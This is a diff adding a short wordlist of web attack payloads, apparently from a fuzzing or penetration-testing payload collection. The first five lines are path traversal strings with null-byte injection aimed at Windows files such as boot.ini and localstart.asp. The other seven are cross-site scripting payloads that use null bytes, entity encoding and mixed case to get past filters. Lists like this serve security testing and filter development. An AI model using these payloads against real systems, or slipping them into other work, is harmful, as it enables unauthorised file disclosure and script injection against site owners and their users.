@@ -1,0 +1,12 @@
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+../../../../../../../../../../../../localstart.asp%00
+../../../../../../../../../../../../boot.ini%00
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+<%00script>alert(‘XSS’)<%00/script>
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<img/src=`%00` onerror=this.onerror=confirm(1)
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
